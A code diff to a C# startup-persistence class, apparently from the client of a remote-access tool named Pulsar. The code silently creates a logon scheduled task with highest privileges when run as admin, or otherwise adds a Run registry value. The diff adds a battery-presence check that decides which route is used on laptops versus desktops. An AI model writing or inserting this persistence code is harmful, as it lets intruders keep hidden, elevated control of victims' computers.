@@ -2,6 +2,7 @@
 using Pulsar.Client.Helper;
 using Pulsar.Common.Enums;
 using System.Diagnostics;
+using System.Windows.Forms;
 
 namespace Pulsar.Client.Setup
 {
@@ -9,44 +10,71 @@ namespace Pulsar.Client.Setup
     {
         public void AddToStartup(string executablePath, string startupName)
         {
-            if (UserAccount.Type == AccountType.Admin)
+            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+               
+                
+                if (UserAccount.Type == AccountType.Admin)
                 {
-                    Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
-                                "\" /rl HIGHEST /f",
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
+                                    "\" /rl HIGHEST /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
 
-                Process p = Process.Start(startInfo);
-                p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return;
+               
+                
+                }
+
+                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
+                    true);
+
+            }
+            else
+            {
+                RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
+                    true);
             }
 
-            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
-                true);
+
         }
 
         public void RemoveFromStartup(string startupName)
         {
-            if (UserAccount.Type == AccountType.Admin)
+
+
+            if (SystemInformation.PowerStatus.BatteryChargeStatus == BatteryChargeStatus.NoSystemBattery)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                if (UserAccount.Type == AccountType.Admin)
                 {
-                    Arguments = "/delete /tn \"" + startupName + "\" /f",
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                    {
+                        Arguments = "/delete /tn \"" + startupName + "\" /f",
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    };
 
-                Process p = Process.Start(startInfo);
-                p.WaitForExit(1000);
-                if (p.ExitCode == 0) return;
+                    Process p = Process.Start(startInfo);
+                    p.WaitForExit(1000);
+                    if (p.ExitCode == 0) return;
+                }
+
+                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
             }
-
-            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
-                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+            else
+            {
+                RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+            }
+              
         }
     }
 }
